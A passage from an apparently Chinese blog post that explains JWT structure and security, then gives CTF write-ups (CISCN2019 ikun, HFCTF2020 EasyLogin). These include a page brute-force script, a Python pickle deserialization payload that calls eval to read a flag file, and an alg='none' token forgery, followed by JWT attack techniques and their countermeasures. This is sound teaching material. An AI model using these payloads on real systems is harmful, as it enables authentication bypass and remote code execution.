alt=\"\"></p>\n<p>JWT 本质上就是一组字串，通过（ <code>.</code> ）切分成三个为 Base64 编码的部分：</p>\n<ul>\n<li><strong>Header</strong> : 描述 JWT 的元数据，定义了生成签名的算法以及  <code>Token</code>  的类型。</li>\n<li><strong>Payload</strong> : 用来存放实际需要传递的数据</li>\n<li><strong>Signature（签名）</strong> ：服务器通过 Payload、Header 和一个密钥 (Secret) 使用 Header 里面指定的签名算法（默认是 HMAC SHA256）生成。</li>\n</ul>\n<p>JWT 通常是这样的： <code>xxxxx.yyyyy.zzzzz</code> 。</p>\n<p>示例：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.</span><br><span class=\"line\">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.</span><br><span class=\"line\">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br></pre></td></tr></table></figure>\n<p>你可以在 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9qd3QuaW8v\">jwt.ioopen in new window</span> 这个网站上对其 JWT 进行解码，解码之后得到的就是 Header、Payload、Signature 这三部分。</p>\n<p>Header 和 Payload 都是 JSON 格式的数据，Signature 由 Payload、Header 和 Secret (密钥) 通过特定的计算公式和加密算法得到。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/jwt.io.png\" alt=\"img\"></p>\n<h3 id=\"header\"><a class=\"markdownIt-Anchor\" href=\"#header\">#</a> header</h3>\n<p>Header 通常由两部分组成：</p>\n<ul>\n<li><code>typ</code> （Type）：令牌类型，也就是 JWT。</li>\n<li><code>alg</code> （Algorithm） ：签名算法，比如 HS256。</li>\n</ul>\n<p>示例：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;alg&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;HS256&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;typ&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;JWT&quot;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>JSON 形式的 Header 被转换成 Base64 编码，成为 JWT 的第一部分。</p>\n<h3 id=\"payload\"><a class=\"markdownIt-Anchor\" href=\"#payload\">#</a> Payload</h3>\n<p>Payload 也是 JSON 格式数据，其中包含了 Claims (声明，包含 JWT 的相关信息)。</p>\n<p>Claims 分为三种类型：</p>\n<ul>\n<li><strong>Registered Claims（注册声明）</strong> ：预定义的一些声明，建议使用，但不是强制性的。</li>\n<li><strong>Public Claims（公有声明）</strong> ：JWT 签发方可以自定义的声明，但是为了避免冲突，应该在 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaWFuYS5vcmcvYXNzaWdubWVudHMvand0L2p3dC54aHRtbA==\">IANA JSON Web Token Registryopen in new window</span> 中定义它们。</li>\n<li><strong>Private Claims（私有声明）</strong> ：JWT 签发方因为项目需要而自定义的声明，更符合实际项目场景使用。</li>\n</ul>\n<p>下面是一些常见的注册声明：</p>\n<ul>\n<li><code>iss</code> （issuer）：JWT 签发方。</li>\n<li><code>iat</code> （issued at time）：JWT 签发时间。</li>\n<li><code>sub</code> （subject）：JWT 主题。</li>\n<li><code>aud</code> （audience）：JWT 接收方。</li>\n<li><code>exp</code> （expiration time）：JWT 的过期时间。</li>\n<li><code>nbf</code> （not before time）：JWT 生效时间，早于该定义的时间的 JWT 不能被接受处理。</li>\n<li><code>jti</code> （JWT ID）：JWT 唯一标识。</li>\n</ul>\n<p>示例：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;uid&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;ff1212f5-d8d1-4496-bf41-d2dda73de19a&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;sub&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;1234567890&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;John Doe&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;exp&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">15323232</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;iat&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1516239022</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;scope&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"string\">&quot;admin&quot;</span><span class=\"punctuation\">,</span> <span class=\"string\">&quot;user&quot;</span><span class=\"punctuation\">]</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>Payload 部分默认是不加密的，<strong>一定不要将隐私信息存放在 Payload 当中！！！</strong></p>\n<p>JSON 形式的 Payload 被转换成 Base64 编码，成为 JWT 的第二部分。</p>\n<h3 id=\"signature\"><a class=\"markdownIt-Anchor\" href=\"#signature\">#</a> Signature</h3>\n<p>Signature 部分是对前两部分的签名，作用是防止 JWT（主要是 payload） 被篡改。</p>\n<p>这个签名的生成需要用到：</p>\n<ul>\n<li>Header + Payload。</li>\n<li>存放在服务端的密钥 (一定不要泄露出去)。</li>\n<li>签名算法。</li>\n</ul>\n<p>签名的计算公式如下：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HMACSHA256(</span><br><span class=\"line\">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class=\"line\">  base64UrlEncode(payload),</span><br><span class=\"line\">  secret)</span><br></pre></td></tr></table></figure>\n<p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用 &quot;点&quot;（ <code>.</code> ）分隔，这个字符串就是 JWT 。</p>\n<h2 id=\"jwt进行身份验证\"><a class=\"markdownIt-Anchor\" href=\"#jwt进行身份验证\">#</a> JWT 进行身份验证</h2>\n<p>在基于 JWT 进行身份验证的的应用程序中，服务器通过 Payload、Header 和 Secret (密钥) 创建 JWT 并将 JWT 发送给客户端。客户端接收到 JWT 之后，会将其保存在 Cookie 或者 localStorage 里面，以后客户端发出的所有请求都会携带这个令牌</p>\n<p>Session 是在服务器端的，而 JWT 是在客户端的。</p>\n<p>![](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9rYnNoaXJlLTEzMDg5ODE2OTcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWcvand0LWF1dGhlbnRpY2F0aW9u\">https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/jwt-authentication</span> process.png)</p>\n<p>简化后的步骤如下：</p>\n<ol>\n<li>用户向服务器发送用户名、密码以及验证码用于登陆系统。</li>\n<li>如果用户用户名、密码以及验证码校验正确的话，服务端会返回已经签名的 Token，也就是 JWT。</li>\n<li>用户以后每次向后端发请求都在 Header 中带上这个 JWT 。</li>\n<li>服务端检查 JWT 并从中获取用户相关信息。</li>\n</ol>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221206152548804.png\" alt=\"image-20221206152548804\"></p>\n<p>两点建议：</p>\n<ol>\n<li>建议将 JWT 存放在 localStorage 中，放在 Cookie 中会有 CSRF 风险。</li>\n<li>请求服务端并携带 JWT 的常见做法是将其放在 HTTP Header 的  <code>Authorization</code>  字段中（ <code>Authorization: Bearer Token</code> ）。</li>\n</ol>\n<h2 id=\"防止-jwt-被篡改\"><a class=\"markdownIt-Anchor\" href=\"#防止-jwt-被篡改\">#</a> 防止 JWT 被篡改</h2>\n<p>有了签名之后，即使 JWT 被泄露或者截获，黑客也没办法同时篡改 Signature 、Header 、Payload。</p>\n<p>这是为什么呢？因为服务端拿到 JWT 之后，会解析出其中包含的 Header、Payload 以及 Signature 。服务端会根据 Header、Payload、密钥再次生成一个 Signature。拿新生成的 Signature 和 JWT 中的 Signature 作对比，如果一样就说明 Header 和 Payload 没有被修改。</p>\n<p>不过，如果服务端的秘钥也被泄露的话，黑客就可以同时篡改 Signature 、Header 、Payload 了。黑客直接修改了 Header 和 Payload 之后，再重新生成一个 Signature 就可以了。</p>\n<p><strong>密钥一定保管好，一定不要泄露出去。JWT 安全的核心在于签名，签名安全的核心在密钥。</strong></p>\n<h2 id=\"如何加强-jwt-的安全性\"><a class=\"markdownIt-Anchor\" href=\"#如何加强-jwt-的安全性\">#</a> 如何加强 JWT 的安全性？</h2>\n<ol>\n<li>使用安全系数高的加密算法。</li>\n<li>使用成熟的开源库，没必要造轮子。</li>\n<li>JWT 存放在 localStorage 中而不是 Cookie 中，避免 CSRF 风险。</li>\n<li>一定不要将隐私信息存放在 Payload 当中。</li>\n<li>密钥一定保管好，一定不要泄露出去。JWT 安全的核心在于签名，签名安全的核心在密钥。</li>\n<li>Payload 要加入  <code>exp</code>  （JWT 的过期时间），永久有效的 JWT 不合理。并且，JWT 的过期时间不易过长。</li>\n</ol>\n<h2 id=\"jwt优势\"><a class=\"markdownIt-Anchor\" href=\"#jwt优势\">#</a> jwt 优势</h2>\n<p>相比于 Session 认证的方式来说，使用 JWT 进行身份认证主要有下面 4 个优势。</p>\n<h3 id=\"无状态\"><a class=\"markdownIt-Anchor\" href=\"#无状态\">#</a> 无状态</h3>\n<p>JWT 自身包含了身份验证所需要的所有信息，因此，我们的服务器不需要存储 Session 信息。这显然增加了系统的可用性和伸缩性，大大减轻了服务端的压力。</p>\n<h3 id=\"有效避免了-csrf-攻击\"><a class=\"markdownIt-Anchor\" href=\"#有效避免了-csrf-攻击\">#</a> 有效避免了 CSRF 攻击</h3>\n<p>一般情况下我们使用 JWT 的话，在我们登录成功获得 JWT 之后，一般会选择存放在 localStorage 中。前端的每一个请求后续都会附带上这个 JWT，整个过程压根不会涉及到 Cookie。因此，即使你点击了非法链接发送了请求到服务端，这个非法请求也是不会携带 JWT 的，所以这个请求将是非法的。</p>\n<p>总结来说就一句话：<strong>使用 JWT 进行身份验证不需要依赖 Cookie ，因此可以避免 CSRF 攻击。</strong></p>\n<h3 id=\"适合移动端应用\"><a class=\"markdownIt-Anchor\" href=\"#适合移动端应用\">#</a> 适合移动端应用</h3>\n<p>使用 Session 进行身份认证的话，需要保存一份信息在服务器端，而且这种方式会依赖到 Cookie（需要 Cookie 保存  <code>SessionId</code> ），所以不适合移动端。</p>\n<p>但是，使用 JWT 进行身份认证就不会存在这种问题，因为只要 JWT 可以被客户端存储就能够使用，而且 JWT 还可以跨语言使用。</p>\n<h3 id=\"单点登录友好\"><a class=\"markdownIt-Anchor\" href=\"#单点登录友好\">#</a> 单点登录友好</h3>\n<p>使用 Session 进行身份认证的话，实现单点登录，需要我们把用户的 Session 信息保存在一台电脑上，并且还会遇到常见的 Cookie 跨域的问题。但是，使用 JWT 进行认证的话， JWT 被保存在客户端，不会存在这些问题。</p>\n<h2 id=\"jwt在ctf中运用\"><a class=\"markdownIt-Anchor\" href=\"#jwt在ctf中运用\">#</a> jwt 在 ctf 中运用</h2>\n<h3 id=\"ciscn2019-华北赛区-day1-web2ikun\"><a class=\"markdownIt-Anchor\" href=\"#ciscn2019-华北赛区-day1-web2ikun\">#</a> [CISCN2019 华北赛区 Day1 Web2] ikun</h3>\n<p>1. 通过脚本爆破 lv6 的 page</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">url=&quot;http://3ecc60d7-c14f-4805-9476-71bcd91747c8.node3.buuoj.cn/shop?page=&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(0,2000):</span><br><span class=\"line\">    print(i)</span><br><span class=\"line\">    r=requests.get( url + str(i) )</span><br><span class=\"line\">    if &#x27;lv6.png&#x27; in r.text:</span><br><span class=\"line\">        print (i)</span><br><span class=\"line\">        break</span><br></pre></td></tr></table></figure>\n<p>2. 随便注册，然后登陆</p>\n<p>3. 将 lv6 加入购物车然后抓包，修改 discount 和 jwt</p>\n<p>修改 jwt 时涉及到 jwt 伪造和 secret 爆破</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JyZW5kYW4tcml1cy9jLWp3dC1jcmFja2Vy\">brendan-rius/c-jwt-cracker: JWT brute force cracker written in C (github.com)</span></p>\n<p>通过 jwtcracker 爆破 secret，得到 <code>1Kun</code></p>\n<p>题目中还说需要 admin，那就伪造</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221207135357827.png\" alt=\"image-20221207135357827\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221207140037810.png\" alt=\"image-20221207140037810\"></p>\n<p>4. 源码泄露，python 反序列化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import tornado.web</span><br><span class=\"line\">from sshop.base import BaseHandler</span><br><span class=\"line\">import pickle</span><br><span class=\"line\">import urllib</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class AdminHandler(BaseHandler):</span><br><span class=\"line\">    @tornado.web.authenticated</span><br><span class=\"line\">    def get(self, *args, **kwargs):</span><br><span class=\"line\">        if self.current_user == &quot;admin&quot;:</span><br><span class=\"line\">            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            return self.render(&#x27;no_ass.html&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    @tornado.web.authenticated</span><br><span class=\"line\">    def post(self, *args, **kwargs):</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            become = self.get_argument(&#x27;become&#x27;)</span><br><span class=\"line\">            p = pickle.loads(urllib.unquote(become))</span><br><span class=\"line\">            return self.render(&#x27;form.html&#x27;, res=p, member=1)</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\">import urllib</span><br><span class=\"line\"></span><br><span class=\"line\">class payload(object):</span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">       return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))    #打开读取flag.txt的内容</span><br><span class=\"line\"></span><br><span class=\"line\">a = pickle.dumps(payload())  #序列化payload</span><br><span class=\"line\">a = urllib.quote(a)  #进行url编码</span><br><span class=\"line\">print a</span><br><span class=\"line\"></span><br><span class=\"line\"># c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221207140234730.png\" alt=\"image-20221207140234730\"></p>\n<h3 id=\"hfctf2020easylogin\"><a class=\"markdownIt-Anchor\" href=\"#hfctf2020easylogin\">#</a> [HFCTF2020]EasyLogin</h3>\n<p><strong>Node 的 JWT 库的空加密缺陷</strong></p>\n<p>通过查看源码，发现 /static/js/app.js 页面存在提示<br>\n<strong> koa-static 错误配置的源码泄露</strong><br>\n说明 app.js 是直接静态映射到程序根目录的，直接访问根目录的该文件可直接看到源码</p>\n<blockquote>\n<p>/**<br>\n*  或许该用 koa-static 来处理静态文件<br>\n *  路径该怎么配置？不管了先填个根目录 XD<br>\n*/</p>\n</blockquote>\n<p>关与 node 的代码分析不再叙述，可以到哦下面的连接自己看</p>\n<p><strong>1. 将加密方式改为 none</strong></p>\n<blockquote>\n<p>签名算法确保恶意用户在传输过程中不会修改 JWT。但是标题中的 alg 字段可以更改为 none。一些 JWT 库支持无算法，即没有签名算法。当 alg 为 none 时，后端将不执行签名验证。将 alg 更改为 none 后，从 JWT 中删除签名数据（仅标题 +’.’+ payload +’.’）并将其提交给服务器。</p>\n</blockquote>\n<p><strong>2、secretid 值校验</strong><br>\n要求 sid 不能为 undefined，null，并且必须在全局变量 secrets 数组的长度和 0 之间。<br>\nJavaScript 是一门弱类型语言，可以通过空数组与数字比较永远为真或是小数来绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># py脚本</span><br><span class=\"line\">import jwt</span><br><span class=\"line\">token = jwt.encode(&#123;&quot;secretid&quot;:0.1,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;,algorithm=&quot;none&quot;,key=&quot;&quot;)</span><br><span class=\"line\">print(token)</span><br></pre></td></tr></table></figure>\n<p>3. 登录时抓包改 authorization</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221207144053858.png\" alt=\"image-20221207144053858\"></p>\n<p>或者自己进行 base64 编码然后拼接，注入拼接时去掉 base64 的 =</p>\n<p>登录后即可 getflag</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dyYjgxOS9hcnRpY2xlL2RldGFpbHMvMTE3ODg2NTcw\">(72 条消息) CTFHUB-2020 - 虎符 - Web-easy_login-Node.js - 前端 JWT_(∪.∪ )…zzz 的博客 - CSDN 博客</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8wZjc2ZTFjNjllMzM=\">2020 - 虎符网络安全赛道 - Web-easy_login - 简书 (jianshu.com)</span></p>\n<h3 id=\"jwt名词解释\"><a class=\"markdownIt-Anchor\" href=\"#jwt名词解释\">#</a> jwt 名词解释</h3>\n<blockquote>\n<p>1.JWS：Signed JWT 签名过的 jwt</p>\n<p>2.JWE：Encrypted JWT 部分 payload 经过加密的 jwt；</p>\n<p>目前加密 payload 的操作不是很普及；</p>\n<p>3.JWK：JWT 的密钥，也就是我们常说的 scret；</p>\n<p>4.JWKset：JWT key set 在非对称加密中，需要的是密钥对而非单独的密钥，在后文中会阐释；</p>\n<p>5.JWA：当前 JWT 所用到的密码学算法；</p>\n<p>6.nonsecure JWT：当头部的签名算法被设定为 none 的时候，该 JWT 是不安全的；因为签名的部分空缺，所有人都可以修改。</p>\n</blockquote>\n<h3 id=\"jws-的结构\"><a class=\"markdownIt-Anchor\" href=\"#jws-的结构\">#</a> JWS 的结构</h3>\n<p>JWS ，也就是 JWT Signature，其结构就是在之前 nonsecure JWT 的基础上，在头部声明签名算法，并在最后添加上签名。创建签名，是保证 jwt 不能被他人随意篡改。</p>\n<p>为了完成签名，除了用到 header 信息和 payload 信息外，还需要算法的密钥，也就是 secret。当利用非对称加密方法的时候，这里的 secret 为私钥。</p>\n<p>为了方便后文的展开，我们把 JWT 的密钥或者密钥对，统一称为 JSON Web Key，也就是 JWK。</p>\n<p>到目前为止，jwt 的签名算法有三种。</p>\n<p>对称加密 HMAC【哈希消息验证码】：HS256/HS384/HS512</p>\n<p>非对称加密 RSASSA【RSA 签名算法】（RS256/RS384/RS512）和 ECDSA【椭圆曲线数据签名算法】（ES256/ES384/ES512）</p>\n<p>最后将签名与之前的两段内容用。连接，就可以得到经过签名的 JWT，也就是 JWS。</p>\n<p>当验证签名的时候，利用公钥或者密钥来解密 Sign，和 base64UrlEncode (header) + “.” + base64UrlEncode (payload) 的内容完全一样的时候，表示验证通过。</p>\n<h3 id=\"jwt-攻击手段\"><a class=\"markdownIt-Anchor\" href=\"#jwt-攻击手段\">#</a> JWT 攻击手段</h3>\n<p>JWT 的攻击手段包括以下内容：</p>\n<p>参考网站：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hdXRoMC5jb20vYmxvZy9jcml0aWNhbC12dWxuZXJhYmlsaXRpZXMtaW4tanNvbi13ZWItdG9rZW4tbGlicmFyaWVzLy8lRTMlODAlODI=\">https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries//。</span></p>\n<h4 id=\"1-敏感信息泄露\"><a class=\"markdownIt-Anchor\" href=\"#1-敏感信息泄露\">#</a> 1. 敏感信息泄露</h4>\n<p>当服务端的秘钥泄密的时候，JWT 的伪造就变得非常简单容易。对此，服务端应该妥善保管好私钥，以免被他人窃取。</p>\n<h4 id=\"2-将加密方式改为none\"><a class=\"markdownIt-Anchor\" href=\"#2-将加密方式改为none\">#</a> 2. 将加密方式改为’none’</h4>\n<p>下文实战中的 Juice Shop JWT issue 1 便是这个问题。之前谈及过 nonsecure JWT 的问题。</p>\n<p>签名算法确保恶意用户在传输过程中不会修改 JWT。但是标题中的 alg 字段可以更改为 none。一些 JWT 库支持无算法，即没有签名算法。当 alg 为 none 时，后端将不执行签名验证。将 alg 更改为 none 后，从 JWT 中删除签名数据（仅标题 +’.’+ payload +’.’）并将其提交给服务器。</p>\n<p><strong>解决对策：</strong></p>\n<blockquote>\n<p>不允许出现 none 的方法；</p>\n<p>将开启 alg : none 作为一种额外的配置选项。</p>\n</blockquote>\n<h4 id=\"3将算法rs256修改为hs256非对称密码算法对称密码算法\"><a class=\"markdownIt-Anchor\" href=\"#3将算法rs256修改为hs256非对称密码算法对称密码算法\">#</a> 3. 将算法 RS256 修改为 HS256（非对称密码算法 =&gt; 对称密码算法）</h4>\n<p>HS256 使用密钥来签名和验证每个消息。而 RS256 使用私钥对消息进行签名并使用公钥进行认证。</p>\n<p>如果将算法从 RS256 更改为 HS256，则后端代码使用公钥作为密钥，然后使用 HS256 算法验证签名。由于攻击者有时可以获取公钥，因此攻击者可以将标头中的算法修改为 HS256，然后使用 RSA 公钥对数据进行签名。</p>\n<p>此时，后端代码就会使用 RSA 公钥 + HS256 算法进行签名验证，从而让验证通过。</p>\n<p><strong>解决对策：</strong></p>\n<blockquote>\n<p>不允许 HS256 等对称加密 算法读取秘钥。jwtpy 就是限制了这种方法。当读取到 类似于 “— xxx key —” 的参数的时候应抛出错误；</p>\n<p>将秘钥与验证算法相互匹配。</p>\n</blockquote>\n<h4 id=\"4-hs256对称加密密钥破解\"><a class=\"markdownIt-Anchor\" href=\"#4-hs256对称加密密钥破解\">#</a> 4. HS256（对称加密）密钥破解</h4>\n<p>如果 HS256 密钥强度较弱，则可以直接强制使用，通过爆破 HS256 的秘钥可以完成该操作。难度比较低。解决对策很简单，使用复杂的秘钥即可。</p>\n<h4 id=\"5-错误的堆叠加密签名验证假设\"><a class=\"markdownIt-Anchor\" href=\"#5-错误的堆叠加密签名验证假设\">#</a> 5. 错误的堆叠加密 + 签名验证假设</h4>\n<p><strong>错误的堆叠加密</strong></p>\n<p>这种攻击发生在单个的或者嵌套的 JWE 中，我们想象一个 JWE 如下所示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JWT RAW</span><br><span class=\"line\"></span><br><span class=\"line\">    header : ...</span><br><span class=\"line\"></span><br><span class=\"line\">    payload: &quot;admin&quot; : false</span><br><span class=\"line\"></span><br><span class=\"line\">             &quot;uid&quot;   : 123</span><br><span class=\"line\"></span><br><span class=\"line\">             &quot;umail&quot; : 123@126.com</span><br><span class=\"line\"></span><br><span class=\"line\">             ...</span><br><span class=\"line\"></span><br><span class=\"line\">JWE Main</span><br><span class=\"line\"></span><br><span class=\"line\">    protected / unprotected</span><br><span class=\"line\"></span><br><span class=\"line\">    recipients:</span><br><span class=\"line\"></span><br><span class=\"line\">        en_key : key1</span><br><span class=\"line\"></span><br><span class=\"line\">        en_key : key2</span><br><span class=\"line\"></span><br><span class=\"line\">    cipher : xxx</span><br></pre></td></tr></table></figure>\n<p>在攻击者不修改秘钥的情况下，对于 ciphertext 进行修改。往往会导致解密的失败。但是，即使是失败，很多 JWT 的解密也是会有输出的，在没有附加认证数据（ADD）的情况下更是如此。攻击者对于 ciphertext 的内容进行修改，可能会让其他的数据无法解密，但是只要最后输出的 payload 中，有 “admin&quot;:true。 其目的就已经达到了。</p>\n<p><strong>解决对策：</strong></p>\n<blockquote>\n<p>对于 JWE 而言，应当解密所有数据，而非从解密的结果中提取单个需要的数据。另外，利用附加认证数据 ADD，也是非常好的选择。</p>\n</blockquote>\n<p><strong>签名假设验证</strong></p>\n<p>这种攻击发生嵌套的 JWS 中。我们想象一个嵌套的 JWS, 其包括了两层的部分，其结构如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JWT Main</span><br><span class=\"line\"></span><br><span class=\"line\">    JWT Sub1</span><br><span class=\"line\"></span><br><span class=\"line\">        payload</span><br><span class=\"line\"></span><br><span class=\"line\">        Signature2</span><br><span class=\"line\"></span><br><span class=\"line\">    Signature</span><br></pre></td></tr></table></figure>\n<p>现在，攻击者通过一定的方式，能够让外层的验证通过的时候，此时，系统还应该检查内层的签名数据，如果不检查，攻击者就可以随意篡改 payload 的数据，来达到越权的目的。</p>\n<p><strong>解决对策：</strong></p>\n<blockquote>\n<p>因此对于嵌套 JWS 而言，应当验证所有层面的签名是否正确，而非验证最外层的签名是否正确就足够。</p>\n</blockquote>\n<h4 id=\"6-无效椭圆曲线攻击\"><a class=\"markdownIt-Anchor\" href=\"#6-无效椭圆曲线攻击\">#</a> 6. 无效椭圆曲线攻击</h4>\n<p>椭圆曲线加密是一种非常安全的方式，甚至从某种程度上而言，比 RSA 更加安全。关于椭圆曲线的算法，在此不展开。</p>\n<p>在椭圆曲线加密中，公钥是椭圆曲线上的一个点，而私钥只是一个位于特殊但非常大的范围内的数字。 如果未验证对这些操作的输入，那攻击者就可以进行设计，从而恢复私钥。</p>\n<p>而这种攻击已在过去中得到证实。这类攻击被称为无效曲线攻击。这种攻击比较复杂，也设计到很多的数学知识。详细可以参考文档：<span class=\"exturl\" 